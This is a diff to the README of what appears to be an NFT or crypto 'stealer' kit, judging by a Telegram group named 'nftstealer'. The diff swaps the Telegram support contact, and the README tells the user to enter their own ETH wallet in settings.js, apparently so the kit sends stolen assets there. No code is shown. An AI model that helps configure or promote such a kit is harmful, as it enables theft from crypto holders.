@@ -17,11 +17,11 @@
 you need to edit the **settings.js** file. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 
-To get instant support, contact me on [@0xTracey](https://t.me/0xTracey)
+To get instant support, contact me on [@faible](https://t.me/faible)
 
 ## `🌊 Socials`
 
-- Telegram: https://t.me/0xTracey
+- Telegram: https://t.me/faible
 - Group: https://t.me/nftstealer
 
 ##### Please ⭐ the repo to support this project & follow next updates
